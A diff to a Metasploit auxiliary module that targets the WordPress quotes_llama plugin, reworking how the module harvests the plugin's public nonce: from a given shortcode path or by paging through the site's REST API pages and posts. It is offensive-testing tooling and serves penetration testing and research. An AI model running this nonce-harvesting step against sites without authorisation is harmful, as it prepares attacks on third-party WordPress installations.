@@ -150,42 +150,60 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  # Looks for the public nonce. An explicit SHORTCODE_PATH wins, otherwise the
+  # REST API is used so the shortcode page does not need to be known in advance:
+  # its rendered content carries the nonce.
   def nonce
     return @nonce if @nonce
 
-    nonce_sources.each do |source|
-      vprint_status("Searching for a public nonce in #{source[:uri]}")
-      res = send_request_cgi({ 'method' => 'GET', 'uri' => source[:uri] }.merge(source[:extra]))
-      next unless res&.code == 200
+    unless datastore['SHORTCODE_PATH'].to_s.strip.empty?
+      uri = normalize_uri(target_uri.path, datastore['SHORTCODE_PATH'])
+      vprint_status("Searching for a public nonce in #{uri}")
+      @nonce = nonce_from(send_request_cgi('method' => 'GET', 'uri' => uri))
+      return @nonce if @nonce
+    end
 
-      match = res.body.match(NONCE_REGEX)
-      next if match.nil?
-
-      @nonce = match[1]
-      vprint_good("Recovered public quotes_llama nonce: #{@nonce}")
-      return @nonce
+    %w[pages posts].each do |collection|
+      @nonce = nonce_from_collection(collection)
+      return @nonce if @nonce
     end
 
     nil
   end
 
-  # Ordered list of places to look for the public nonce. An explicit path wins,
-  # otherwise the REST API is used so the shortcode page does not need to be
-  # known in advance: its rendered content carries the nonce.
-  def nonce_sources
-    sources = []
+  # Walks every page of a REST API collection. WordPress caps per_page at 100 and
+  # reports the page count in the X-WP-TotalPages header, so the shortcode page
+  # is found even when it is not among the first 100 records.
+  def nonce_from_collection(collection)
+    uri = normalize_uri(target_uri.path, 'wp-json', 'wp', 'v2', collection)
+    page = 1
 
-    unless datastore['SHORTCODE_PATH'].to_s.strip.empty?
-      sources << { uri: normalize_uri(target_uri.path, datastore['SHORTCODE_PATH']), extra: {} }
+    loop do
+      vprint_status("Searching for a public nonce in #{uri} (page #{page})")
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri' => uri,
+        'vars_get' => { 'per_page' => '100', 'page' => page.to_s }
+      )
+      return nil unless res&.code == 200
+
+      found = nonce_from(res)
+      return found if found
+
+      total_pages = res.headers['X-WP-TotalPages'].to_i
+      return nil if page >= total_pages
+
+      page += 1
     end
+  end
 
-    %w[pages posts].each do |collection|
-      sources << {
-        uri: normalize_uri(target_uri.path, 'wp-json', 'wp', 'v2', collection),
-        extra: { 'vars_get' => { 'per_page' => '100' } }
-      }
-    end
+  def nonce_from(res)
+    return nil unless res&.code == 200
 
-    sources
+    found = res.body[NONCE_REGEX, 1]
+    return nil unless found
+
+    vprint_good("Recovered public quotes_llama nonce: #{found}")
+    found
   end
 end
